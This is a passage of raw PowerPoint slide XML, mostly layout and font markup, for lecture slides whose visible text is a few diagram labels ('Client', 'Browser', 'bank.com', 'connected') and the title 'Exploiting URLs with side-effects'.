            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78862" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2480703" y="5244353"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78863" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2638986" y="5727608"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="4" name="Straight Arrow Connector 3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="78851" idx="2"/>
            <a:endCxn id="78860" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3405188" y="4000500"/>
            <a:ext cx="37819" cy="121303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78865" name="TextBox 17"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3546662" y="4438931"/>
            <a:ext cx="1534779" cy="472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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>connected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="391327170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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79875" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79876" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79877" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79880" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
